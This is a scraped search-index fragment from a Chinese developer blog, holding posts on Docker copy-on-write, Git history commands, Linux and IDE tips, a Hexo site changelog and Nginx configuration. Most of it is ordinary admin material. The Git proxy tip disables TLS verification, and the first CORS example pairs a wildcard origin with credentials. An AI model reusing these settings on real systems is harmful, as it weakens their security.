上面的操作中，只有当需要修改时才复制一份数据，这种特性被称作写时复制（copy-on-write）。可见容器层保存的是镜像变化的部分，不会对镜像本身进行任何修改。容器层记录对镜像的修改，所有镜像层都是只读的，不会被容器修改，所以镜像可以被多个容器共享。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Git 之二 - 显示日志、恢复文件、比较文件",url:"/posts/d8e8dbb.html",text:'Git 显示提交的日志信息（本地库）1234567891011121314151617181920212223242526272829303132# 查看所有分支的所有操作的日志信息(包括commit和reset的操作)，一般用于数据恢复$ git reflog# 显示每条提交日志信息的详细内容$ git log# 显示每条提交日志信息的详细内容，包括reflog的日志信息$ git log -g# 显示每条提交日志信息更详细的内容$ git log --pretty=raw# 将每条提交日志信息输出为一行显示$ git log --pretty=oneline# 将每条提交日志信息的摘要内容输出为一行显示$ git log --oneline# 将每条提交日志信息的摘要内容输出为一行显示，并指定显示多少条日志$ git log --oneline -2# 指定从第几条日志信息开始显示，例如从第三条日志信息开始显示$ git log --skip 2# 显示每条提交日志信息的详细内容，包含每次提交对应的文件操作类型（增删改）$ git log --name-status# 显示每条提交日志信息的详细内容，包含文件详细的改动记录$ git log -p# 绘制提交的线索图$ git log --graph Git 搜索提交的日志信息（本地库）12345678# 匹配签名信息（例如：“peter@gmail.com”）中的任意内容，搜索某人提交的所有日志信息$ git log --author peter# 根据提交时填写的备注信息，搜索提交的日志信息$ git log --grep keywords# 搜索某个文件的所有改动记录，参数是文件完整的相对路径或者绝对路径$ git log -p -- config/my.config Git 恢复到某个提交的历史版本（本地库）此操作适用于文件的删除或修改操作 commit 之后，想找回已删除的文件，或者将文件还原到修改前的某个历史版本，成功的前提是被删除或者被修改的文件必须曾经 commit 到本地库 12345678910111213141516171819202122232425262728# 查看所有分支的所有操作的日志信息(包括commit和reset的操作)，一般用于数据恢复$ git reflog4630fa3 HEAD@{0}: commit: update message346f528 HEAD@{1}: commit: update messageb86daaa HEAD@{2}: commit: update messagefdbbf3c HEAD@{3}: commit: update message775a0c5 HEAD@{4}: commit: update message42a3d41 HEAD@{5}: commit: update message81f4118 HEAD@{6}: commit: update message0c05880 HEAD@{7}: commit: update message670e552 HEAD@{8}: commit (initial): update message# 基于索引值恢复到指定历史版本（推荐），可以随意往前往后恢复$ git reset --hard 346f528# 基于^符号恢复（只能往后恢复），当同时使用N个^符号时，表示顺序往后恢复N个版本$ git reset --hard HEAD^# 基于~符号恢复（只能往后恢复），数字N表示顺序往后恢复N个版本$ git reset --hard HEAD~1# 恢复到当前本地库中HEAD指针指向的历史版本，一般指的就是HEAD@{0}$ git reset --hard HEAD# reset操作的定义域（必须明确指定，否则可能造成数据不可恢复的丢失）$ git reset --soft 只在本地库移动HEAD指针，暂存区和工作区都不会受影响$ git reset --mixed 默认选项，在本地库移动HEAD指针，暂存区同步到指定的提交，工作区不受影响$ git reset --hard 在本地库移动HEAD指针，暂存区和工作区都同步到指定的提交，强烈建议预先执行一次commit操作，否则可能造成数据不可恢复的丢失 Git 将某个文件回滚到指定版本在使用 Git 时，可能会遇到这种问题：一次 commit 了多个文件，但是提交后发现有一个文件不应该被提交，如果把整个 commit 回滚会很麻烦（因为正确提交的文件也会被回滚），这时就需要单独回滚某个文件，具体操作如下： 12345678# 首先找到特定文件要回滚的版本的hash值$ git log api.json# 利用hash值回滚特定文件（可以直接使用hash值的前六位）$ git checkout 2d1ed0 api.json# 提交回滚后的文件$ git commit -m api.json Git 比较文件差异（本地库）12345678910# 将工作区的文件与暂存区的文件进行比较$ git diff api.json# 将工作区的文件和本地库中HEAD指针指向的历史版本的文件进行比较$ git diff HEAD api.json# 将工作区的文件和本地库上一个历史版本的文件进行比较$ git diff HEAD^ api.json# 注意：当“git diff”命令不指定文件名参数，则代表比较工作区的所有文件 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"版本控制"},{title:"日常编程开发技巧之一",url:"/posts/533ecd67.html",text:'Linux 发行版 12345Arch系：ArchLinux/Antergos/ManjaroRedhat系：CentOS/Fedora/Mageia/openSUSEDebian系：Debian/Ubuntu/Kali/Kubuntu/LinuxMint/Deepin/UbuntuKylinLinux排行榜与Linux实时资讯站点：https://distrowatch.com/ Google 搜索引擎指定搜索的语言范围 12345678默认： 全球各种语言的搜索结果英文： &amp;lr=lang_en日文： &amp;lr=lang_ja中文： &amp;lr=lang_zh-CN中文（含台湾）： &amp;lr=lang_zh-CN%7Clang_zh-TW举例只搜索中文相关的Java内容：https://www.google.com/search?lr=lang_zh-CN&amp;q=Java SSH 客户端通过 Socker5 代理连接到 Linux 目标服务器 12# 下面Socker5代理服务器的IP和端口是127.0.0.1和1080，Linux目标服务器的IP/域名是192.168.1.1，其中Socker5代理服务可以是SS/SSR、Tor...$ ssh -o ProxyCommand=\'nc -x 127.0.0.1:1080 %h %p\' root@192.168.1.1 Linux 解压文件 1234567891011121314151617181920212223242526# 解压.rar后缀的文件$ unrar x xxx.rar# 解压.rar后缀的文件，若文件存在则直接覆盖$ unrar x -o+ xxx.rar# 指定目录深度，解压目录下的所有RAR文件$ find -maxdepth 1 -name \'*.rar\' | xargs -i unrar x {}# 解决unzip解压文件后，出现中文文件名乱码的问题$ unzip -O CP936 xxx.zip# 通过upzip解压文件到指定的目录，前提是指定的目录必须存在$ unzip -d /usr/local gradle-5.4.1-bin.zip# 指定目录深度，解压目录下的所有ZIP文件$ find -maxdepth 1 -name "*.zip" | xargs -i unzip -O CP936 {}# 指定解压目录，前提是指定的目录必须存在$ tar -xvf apache-maven-2.6.tar.gz -C /home/www/apache-maven-2.6# 解压.7z后缀的文件（不保持目录结构）$ 7za e data.7z# 解压.7z后缀的文件（保持目录结构）$ 7za x data.7z Linux 强制删除查找到的文件 12345# 强制删除当前目录下文件名以downloading结尾的所有文件$ find . -name "*downloading" | xargs rm -rf# 或者使用-I指定一个替换字符串{}，这个字符串在xargs扩展时会被替换掉，当-I与xargs结合使用，每一个参数命令都会被执行一次$ find . -name "*downloading" | xargs -I {} rm -rf {} Linux 文件统计 1234567891011121314# 统计当前目录下文件（指定后缀）的总个数$ find . -name "*.html" | wc -l# 统计当前目录下每个文件（指定后缀）的总行数$ find . -name "*.html" | xargs wc -l# 统计当前目录下每个文件（指定后缀）的总字数$ find . -name "*.html" | xargs wc -w# 统计当前目录下每个文件（指定后缀）的总字节数$ find . -name "*.html" | xargs wc -c# 不加任何参数的wc会统计文件的总行数、总字数、总字节数$ find . -name "*.html" | xargs wc 解决 Linux 的 tree 命令不能正确显示中文的问题 12# 添加-N参数$ tree -N Linux 校验文件的哈希值 123456789101112131415# 基于MD5加密算法，获取文件的哈希值$ md5sum tomcat8.tar.gz# 或者将待校验文件的正确MD5哈希值写入到指定的文件，然后通过“md5sum -c”命令输出MD5哈希值比对的结果$ vim tomcat8.md583aca9b98564ba4064aa0acad7360ceb tomcat8.tar.gz# 输出文件的MD5校验结果$ md5sum -c tomcat8.md5tomcat8.tar.gz: OK# 基于SHA1加密算法，获取文件的哈希值$ sha1sum tomcat8.tar.gz# 同上，也可以使用“sha1sum -c”命令进行SHA1哈希值的比对 Git 强制更新并覆盖本地仓库与工作区的文件，即本地强制同步远程仓库的所有文件 1$ git fetch --all &amp;&amp; git reset --hard origin/master &amp;&amp; git pull PM2 服务相关操作命令 1234567891011121314# 启动某个应用$ sudo pm2 start api_server# 关闭某个应用$ sudo pm2 stop api_server# 查看某个应用的运行状态$ sudo pm2 show api_server# 启用PM2开机自启动$ sudo systemctl enable pm2-root# 禁用PM2开机自启动$ sudo systemctl disable pm2-root Centos7 防火墙配置 123456789101112131415161718192021222324252627282930# 切换至Root用户$ su - root# 查看防火墙运行状态# firewall-cmd --state# 查看防火墙运行状态# systemctl status firewalld# 关闭防火墙# systemctl stop firewalld# 启用防火墙# systemctl start firewalld# 配置防火墙永久开放某个端口# firewall-cmd --zone=public --permanent --add-port=8080/tcp# firewall-cmd --zone=public --permanent --add-port=8080/udp# 配置防火墙关闭开放某个端口# firewall-cmd --zone=public --permanent --remove-port=8000/tcp# 保存防火墙配置# firewall-cmd --reload# 查看防火墙已开放的端口# firewall-cmd --list-ports# 查看防火墙已开放的服务# firewall-cmd --list-services 查看 Linux 系统的发行版本 12345678910# 以下方法中，至少有一种方法适用于Redhat、SuSE、Debian系的Linux发行版# 方法一（在不同Linux发行版中，lsb_release命令不一定都存在）$ lsb_release -a# 方法二（xxx为发行版名称，例如os-release、centos-release）$ cat /etc/xxx-release# 方法三$ cat /etc/issue Linux 查看端口占用的情况 12345# 查看端口占用，且显示进程ID（推荐）# netstat -anp|grep 80# 或者（不显示进程ID）# netstat -aon|grep 80 Debian/Ubuntu 防火墙配置 12345678910111213141516171819202122232425# 查看防火墙现有规则# ufw status# 开启防火墙# ufw enable# 关闭防火墙# ufw disable# 开放指定的tcp、udp端口# ufw allow 22/tcp# ufw allow 22/udp# 同时开放tcp与udp端口# ufw allow 22# 删除开放22端口的规则# ufw delete allow 22# 拒绝指定的tcp、udp端口# allow/deny 20/tcp# allow/deny 20/udp# 保存防火墙配置# ufw reload Git 设置代理 1234# 下面的http://127.0.0.1:8118是代理服务器的访问地址，也可以是本地代理工具的访问地址$ git config --global http.proxy http://127.0.0.1:8118$ git config --global https.proxy http://127.0.0.1:8118$ git config --global http.sslverify false YUM 设置代理 12345678910111213141516# 方法一# vim /etc/yum.confproxy=http://127.0.0.1:8118# 方法二# 临时添加环境变量# export http_proxy=http://127.0.0.1:8118# export https_proxy=http://127.0.0.1:8118# 测试代理# curl -I www.google.com# 移除环境变量# unset http_proxy# unset https_proxy Eclipse 常用快捷键 12345678910111213141516171819202122alt + /：代码补全ctrl + d：删除当前行ctrl + h：打开搜索界面ctrl + w：关闭当前Tab页crtl + t：显示类的继承关系ctrl + f：当前查找/当前替换ctrl + shift + x：转换为大写ctrl + shift + y：转换为小写crtl + q：返回到最近编辑的地方ctrl + shift + f：格式化代码ctrl + o：查看当前类的属性、方法ctrl + l：定位到当前文件的某一行ctrl + shift + o：快速生成导入包ctrl + o：查看当前类所有的方法、属性ctrl + f1：快速显示错误代码的Fix方案alt + shift + r：重命名方法名、属性名f3：快速定位光标位置的某个类、方法、属性ctrl + shift + w：关闭打开的所有Tab页ctrl + shift + g：查找类、方法、属性被引用的情况alt + shift + w：快速定位当前文件所在项目中的路径ctrl + shift + t：全局查找Java类文件，可以使用通配符ctrl + shift + r：全局查找文件（包括Java类文件），可以使用通配符 IntelliJ IDEA 常用快捷键 123456789101112131415161718192021222324alt + /：代码补全ctrl + f：当前查找ctrl + x：删除当前行ctrl + f4：关闭当前Tab页crtl + h：显示类的继承关系alt + shift + f：收藏代码ctrl + r：当前查找/当前替换ctrl + alt + l：格式化代码ctrl + shift + u：大小写转换ctrl + e：查看最近打开过的文件ctrl + alt + o：快速生成导入包alt + left：返回到上一个编辑的页面alt + right：进入到下一个编辑的页面ctrl + shift + v：选择要粘贴的内容crtl + shift + r：全局查找/全局替换alt + enter：万能解错/生成返回值变量ctrl + alt + h：查看方法被引用的情况shift + f6：更改文件名、方法名、属性名ctrl + f12：查看当前类所有的方法、属性ctrl + alt + u：在当前Tab页显示类的继承结构图ctrl + shift+i --&gt; ctrl + enter：查看Java源码ctrl + shift + ”+/-”：展开全部代码、折叠全部代码ctrl + alt + shift + u：在新的Tab页显示类的继承结构图ctrl + n：全局搜索普通文件与Java类文件，若需要搜粟包括Jar包里面的内容，需要勾选“include non-project classes”选项 Centos7 重启 IBUS 输入法 1# ibus-daemon -r -d -x Centos7 时间同步 1234567891011121314151617181920212223242526272829# 由于Centos7默认使用chronyd来同步时间，如果需要安装其他时间同步服务（ntpd），则需要禁用chronyd# systemctl disable chronyd# 安装ntp服务# yum install ntp# 使用ntp手动同步时间# ntpdate pool.ntp.org# 开机启动ntp服务# systemctl enable ntpd# 启动ntp服务# systemctl start ntpd# 查看ntp服务的运行状态# systemctl status ntpd# 设置亚洲时区# timedatectl set-timezone Asia/Shanghai# 启用ntp同步# timedatectl set-ntp yes# 查看当前系统时间、时间同步状态# timedatectl status# 查看时间同步服务器列表# ntpq -p JVM 设置代理 1234567# 不支持Socket代理，只支持Http代理-Dhttp.proxyPort=8118-Dhttp.proxyHost=127.0.0.1-Dhttps.proxyPort=8118-Dhttps.proxyHost=127.0.0.1-Dhttp.nonProxyHosts="localhost|127.0.0.1|*.aliyun.com" Centos7 调节屏幕亮度 12345# 安装xgamma# yum install xgamma# 调节调度，其中 0.1 &lt; n &lt; 10.0# xgamma -gamma n 解决 Centos 的 Qt 桌面应用程序无法正常运行的问题 123456789101112131415# 具体表现为应用的界面无法正常显示（白屏 + 界面过度拉伸），一般是Qt对高DPI显示器的配置出了问题# 添加环境变量# vim /etc/profileexport QT_AUTO_SCREEN_SCALE_FACTOR=0# 使环境变量生效# source /etc/profile# 如果应用是在ZSH Shell环境下使用命令启动，则需要在ZSH的配置文件中添加环境变量（区分不同的Linux用户）# vim ~/.zshrcexport QT_AUTO_SCREEN_SCALE_FACTOR=0# 使ZSH配置文件生效（区分不同的Linux用户）# source ~/.zshrc Centos7 的应用快捷方式指定环境变量 1234567891011121314151617181920212223242526272829# 配置示例，在快捷方式文件里指定环境变量：QT_AUTO_SCREEN_SCALE_FACTOR=0# 方法一[Desktop Entry]Version=1.0Name=Redis Desktop ManagerComment=Redis Desktop ManagerType=ApplicationCategories=Development;Exec=env QT_AUTO_SCREEN_SCALE_FACTOR=0 /snap/bin/redis-desktop-manager.rdm %UTerminal=falseStartupNotify=trueIcon=/var/lib/snapd/snap/redis-desktop-manager/current/usr/share/pixmaps/rdm.png# 方法二[Desktop Entry]Version=1.0Name=Redis Desktop ManagerComment=Redis Desktop ManagerType=ApplicationCategories=Development;Exec=bash -c "export QT_AUTO_SCREEN_SCALE_FACTOR=0 &amp;&amp; /usr/bin/vlc --started-from-file %U"Terminal=falseStartupNotify=trueIcon=/var/lib/snapd/snap/redis-desktop-manager/current/usr/share/pixmaps/rdm.png# 参考博客# https://askubuntu.com/questions/144968/set-variable-in-desktop-file# https://askubuntu.com/questions/542152/desktop-file-with-bashrc-environment Centos7 的应用快捷方式使用 Root 权限启动 123456789101112# 以下方法使用了gksu-polkit，目前存在无法通过UI界面关闭应用的Bug（即点击界面上的关闭按钮，应用进程不会被杀死）[Desktop Entry]Version=4.6.2Encoding = UTF-8Type=ApplicationName=eclipse-neonIcon=/usr/local/eclipse-neon/icon.xpmExec=gksu-polkit /usr/local/eclipse-neon/eclipseComment=JEE IDECategories=Development;IDE;Terminal=false Centos7 快捷方式的位置 123456# 全局的应用程序快捷方式/usr/share/applications//usr/local/share/applications/# 特定用户的应用程序快捷方式~/.local/share/applications/ Linux 磁盘分区的空间不足 1234567891. 可以尝试使用Gparted等工具进行分区扩容，但不建议这么做，因为容易破坏硬盘的分区表，导致数据丢失或者造成系统无法正常启动。2. 建议将分区内（磁盘空间不足）体积较大的目录移动到其他分区（磁盘空间充足），然后在分区内（磁盘空间不足）创建软链接或者使用"mount --bind"的方法，指向新目录所在的路径。3. 假设其他分区也没有充足的磁盘空间，那么此时应该新增硬盘并挂载到系统中，然后通过上面介绍的方法将分区内（磁盘空间不足）体积较大的目录移动到新硬盘的分区即可。提示：1) 切记并非所有应用都支持创建软链接（ln -s）的方法，因为创建软链接后有可能会导致部分应用无法正常运行（例如snapd），建议统一使用"mount --bind"2) 假设通过Gparted工具进行分区扩容，扩容之后系统可以正常启动，磁盘分区的容量也确实增加了，但这一切都不能说明扩容操作真的成功了。因为这类操作可能会留下其他后患，例如扩容后使用"再生龙"备份硬盘为镜像文件时，会出现“无法保存分区”的错误信息。 Docker 配置代理 1234567891011121314151617# 此方法适用于Debian/Ubuntu/CentOS系统，修改配置后会持续生效，其中的配置将覆盖docker.service中的选项# 创建存放配置文件的目录# mkdir -p /etc/systemd/system/docker.service.d# 新增代理配置文件# vim /etc/systemd/system/docker.service.d/http-proxy.conf[Service]Environment="HTTP_PROXY=http://192.168.1.122:1080" "HTTPS_PROXY=http://192.168.1.122:1080" "NO_PROXY=localhost,127.0.0.1,mirrors.aliyun.com"# 重载配置# systemctl daemon-reload# 重启Docker服务# systemctl restart docker# 若取消代理，只需删除代理配置文件，并重载配置和重启Docker服务即可 CURL 命令使用 1234567891011121314# 跳过Https证书验证（-k）# curl -k https://example.com# 允许跟随重定向（-L）# curl -I -L http://example.com# 指定请求方式（-X）# curl -X GET http://example.com# 指定用户名密码（-u，注意密码会记录在Bash的历史记录中）# curl -u username:password http://example.com# 指定来源（--referer）# curl -v -I --referer http://source.com htttp://example.com var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux 开发随笔"},{title:"Hexo 博客搭建日志",url:"/posts/fc2b1bbb.html",text:'2018-12-20（截止） 实现博客加密限制访问 基于谷歌、百度的 SEO 优化 添加 404 页面、博客版权声明 博客使用唯一的短字符串作为链接地址（URL） 显示站点的总访问量、每篇博客的阅读量统计与字数统计 基于 Linux + Gitolite + GitHooks + Shell 脚本自主实现 Hexo 的持续部署与博客备份 . . . . . . 2018-12-28 显示站点的总运行时间 添加 PDF 文件在线显示插件 Web 服务器配置跨域、GZIP 压缩、Web 静态资源的浏览器端缓存 2019-01-28 添加代码块折叠插件 2019-02-11 PC 端的页面新增 APlayer 音乐播放器 添加 hexo-generator-sitemap 插件（更改源码），使生成的站点地图忽略 JSON 文件的 URL 卸载官方的 hexo-generator-index 插件，添加 hexo-generator-index2 插件（更改源码），实现首页隐藏指定文章 2019-02-24 添加 Google Analytics 的统计代码 完善谷歌的 SEO 优化（整合重复网址、规范网页） 添加 hexo-autonofollow 插件（更改源码），为博客中的外链自动加上 nofollow 属性 2019-03-03 整理 Hexo 的插件依赖，将以前更改过代码的开源插件和自主开发的插件统一打包为自定义插件，并发布到 NPM 仓库，自定义插件列表如下： ★展开自定义插件列表一★ 12345678910111213hexo-readmorehexo-ssl-authhexo-site-authhexo-yilia-foldhexo-pdf-betterhexo-waline-nexthexo-pangu-betterhexo-next-darkmodehexo-google-adsensehexo-tipue-search-dbhexo-admonition-betterhexo-lazyload-image-betterhexo-generator-sogou-sitemap ★展开自定义插件列表二★ 1234567hexo-toc-customizedhexo-dplayer-customizedhexo-blog-encrypt-customizedhexo-autonofollow-customizedhexo-generator-index2-customizedhexo-generator-sitemap-customizedhexo-generator-json-content-customized 2019-03-05 404 页面改版 使用 Gulp 自定义脚本压缩 CSS、JS、HTML、图片文件，并将 Gulp 压缩集成到 Hexo 的持续部署流程中 更改 Hexo 主题 Yilia 的源码，并通过 Webpack 重新构建编译，实现有序的标签列表、优化主题的显示细节 2019-03-13 将 Web 服务器部署到 Docker 容器内 Web 服务迁移至 Tencent Cloud，更换站点域名 添加 DPlayer 视频播放插件（更改源码），默认支持播放的视频格式包括：mp4、flv、m3u8 2019-03-19 实现全站 HTTPS 化 完成站点页面改造，全面接入百度熊掌 ID 完成站点备案，并在站点的页面底部添加备案号 2019-03-20 添加网页加载进度条 添加显示文章目录的插件（hexo-toc-customized） 2019-09-28 基于 Utterance 新增博客评论功能 2019-09-30 接入微信公众号的 JS-SDK，实现微信分享博客链接时显示缩略图片的功能 2020-01-04 优化移动端的页面，文章详情页面不再显示发布日期、字数统计、阅读量统计 在博客主题的模板中新增谷歌广告代码，广告的固定位置分别是页面左侧的菜单栏（适用于 PC 端）、每篇文章的底部（适用于 PC 端 + 移动端） 新增 Hexo 谷歌广告插件（hexo-google-adsense），支持使用 Hexo 自定义标签在指定的文章中任何地方动态插入谷歌广告代码（适用于 PC 端 + 移动端） 2020-01-08 新增 RSS 订阅功能 基于搜狗搜索引擎的 SEO 优化 新增自动生成搜狗站点地图的 Hexo 插件（hexo-generator-sogou-sitemap） 2020-01-14 PC 端新增站内全文静态搜索功能 添加图片懒加载插件（hexo-lazyload-image-better） 2020-03-28 基于必应搜索引擎的 SEO 优化 2020-04-15 实现 Hexo 的多线部署，使用 Coding Pages、GitHub Pages 来加快国内外访问博客的速度 2021-01-25 基于自定义插件（hexo-pangu-customized），在 HTML 文件里的中文字符和英文字符之间自动添加空格符（MarkDown 代码块除外） 基于自定义插件（hexo-generator-json-content-customized），支持在 Yilia 主题的搜索工具里使用标题来搜索博客时，默认不再隐藏已加密的博客（Posts） 2021-04-12 升级 Gulp 的版本至 4.0.2 升级 Hexo 的版本至 5.4.0 取消 Coding Pages 的多线部署 将博客默认的主题迁移至 NexT，同时保留并兼容旧主题 Yilia 在 NexT 主题的基础上，基于 Docker 新增 Waline 评论系统的前后端支持 2021-04-29 基于自定义插件（hexo-next-darkmode），新增可切换的暗黑模式 2021-06-12 基于自定义插件（hexo-waline-next），支持 Waline 客户端将评论图片上传到七牛图床 2022-01-17 基于自定义插件（hexo-readmore），让用户扫码关注微信公众号后才可以解锁文章 2022-02-24 全站禁用 CDN 资源（仅限于 JS、CSS 资源），统一使用站内的 Web 资源文件 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"Nginx 常用配置",url:"/posts/30985643.html",text:'配置跨域下述的 add_header 末尾都可以加上了 always，它表示不管 HTTP 返回状态码是多少都会使 add_header 生效，有些时候服务端可能会返回 4XX 的 HTTP 状态码，这时候如果少了 always 会导致 add_header 失效，从而导致浏览器报跨域错误。 123456789101112location / { add_header \'Access-Control-Allow-Origin\' \'*\' always; add_header \'Access-Control-Allow-Credentials\' \'true\' always; add_header \'Access-Control-Allow-Methods\' \'GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONS\' always; add_header \'Access-Control-Allow-Headers\' \'Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Origin\' always; if ($request_method = \'OPTIONS\') { return 204; } ...} 或者使用通配符，允许所有头部、所有域、所有方法跨域，存在安全隐患（不推荐使用） 123456789101112location / { add_header \'Access-Control-Allow-Origin\' \'*\' always; add_header \'Access-Control-Allow-Headers\' \'*\' always; add_header \'Access-Control-Allow-Methods\' \'*\' always; add_header \'Access-Control-Allow-Credentials\' \'true\' always; if ($request_method = \'OPTIONS\') { return 204; } ...} 通过 CURL 命令测试配置是否生效 123456789101112131415$ curl -I http://www.example.com/slider.e37972.js# 测试结果HTTP/1.1 200 OKServer: Nginx/2.2.3Date: Tue, 25 Dec 2018 17:59:53 GMTContent-Type: application/javascriptContent-Length: 53386Last-Modified: Tue, 25 Dec 2018 17:56:47 GMTConnection: keep-aliveAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: trueAccess-Control-Allow-Methods: GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONSAccess-Control-Allow-Headers: Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,OriginAccept-Ranges: bytes 删除指定的 Heder相关指令： proxy_set_header is to set a request header add_header is to add header to response proxy_hide_header is to hide a response header 如果要替换响应中已经存在的 Header，仅仅使用 add_header 是不够的，因为它将堆叠值（堆叠来自服务器和自己添加的 Header），所以必须分两步执行操作： 删除 Header：proxy_hide_header Access-Control-Allow-Origin; 添加自定义 Header：add_header Access-Control-Allow-Origin "*" always; 假设需要删除响应中已存在的跨域 Header，然后往响应中添加自定义的跨域 Header，配置示例如下： 123456789101112131415161718location / { proxy_hide_header Access-Control-Allow-Origin; proxy_hide_header Access-Control-Allow-Methods; proxy_hide_header Access-Control-Allow-Headers; proxy_hide_header Access-Control-Allow-Credentials; add_header \'Access-Control-Allow-Origin\' \'*\' always; add_header \'Access-Control-Allow-Credentials\' \'true\' always; add_header \'Access-Control-Allow-Methods\' \'GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONS\' always; add_header \'Access-Control-Allow-Headers\' \'Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Origin\' always; proxy_pass http://example.com; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header REMOTE-HOST $remote_addr;} 配置 GZip 压缩1234567891011http { gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_comp_level 3; gzip_vary off; gzip_disable "MSIE [1-6]\\."; gzip_types text/plain text/css text/xml text/javascript application/json application/x-javascript application/xml application/xml+rss application/javascript; ...} 1234567891011# 通过curl命令测试配置是否生效$ curl -I -H "Accept-Encoding: gzip, deflate" http://www.example.com/slider.e37972.js# 测试结果HTTP/1.1 200 OKServer: Nginx/2.2.3Date: Tue, 25 Dec 2018 17:54:06 GMTContent-Type: application/javascriptLast-Modified: Tue, 25 Dec 2018 17:52:31 GMTConnection: keep-aliveContent-Encoding: gzip Nginx 反向代理配置123456789101112131415161718192021http { upstream applications { server 192.168.68.43:8081 weight=1; server 192.168.68.45:8082 weight=1; } server { listen 80; server_name localhost; location / { proxy_pass http://applications; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-Port $remote_port; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } }} 配置 Web 静态资源的浏览器端缓存123456789101112131415161718192021server { root /home/wwwroot/hexo-blog; location ~ .*\\.(?:jpg|jpeg|gif|png|ico|cur|gz|svg|svgz|mp4|ogg|ogv|webm|eot|ttf|woff|woff2)$ { expires 7d; } location ~ .*\\.(?:js|css)$ { expires 7d; } location ~ .*\\.(?:htm|html)$ { # 根据具体的项目业务，决定是否需要配置浏览器端的静态页面缓存，以下配置表示是不缓存任何Html页面 add_header Cache-Control "private, no-store, no-cache, must-revalidate, proxy-revalidate"; } ...} Nginx 利用 Referer 指令实现防盗链语法说明12345678910语法: valid_referers none | blocked | server_names | string …;配置段: server, location指定合法的来源\'referer\', 他决定了内置变量$invalid_referer的值，如果referer头部包含在这个合法网址列表中，这个变量被设置为0，否则设置为1. 不区分大小写。参数说明：none "Referer" 为空blocked "Referer"不为空，但是里面的值被代理或者防火墙删除了，这些值都不以http://或者https://开头，而是"Referer: XXXXXXX"这种形式server_names "Referer"来源头部包含当前的server_names（当前域名）arbitrary string 任意字符串,定义服务器名或者可选的URI前缀.主机名可以使用*开头或者结尾，在检测来源头部这个过程中，来源域名中的主机端口将会被忽略掉regular expression 正则表达式,~表示排除https://或http://开头的字符串. 两种配置案例123456789101112# 配置案例一：限制来源只能是none、blocked、主机域名、百度、谷歌、必应location ~* \\.(gif|jpg|png|webp)$ { valid_referers none blocked *.baidu.com *.google.com *.bing.com server_names ~\\.baidu\\. ~\\.google\\. ~\\.bing\\.; if ($invalid_referer) { return 403; } root /opt/www/image;} 12345678910111213# 配置案例二：屏蔽所有来自指定域名（例如搜狗）的访问location ~* \\.(gif|jpg|png|webp)$ { valid_referers sogou.com *.sogou.com ~\\.sogou\\.; # 此处必须是匹配空字符串 if ($invalid_referer = \'\'){ return 403; } root /opt/www/image;} 测试配置是否生效123456789101112131415161718192021222324252627282930313233343536# 通过curl命令测试配置是否生效，强烈建议额外测试referer字段为空字符串或者无此字段的请求$ curl -v -k -I --referer https://www.sogou.com https://example.com* About to connect() to www.example.com port 443 (#0)* Trying www.example.com...* Connected to www.example.com (14.215.177.38) port 443 (#0)* Initializing NSS with certpath: 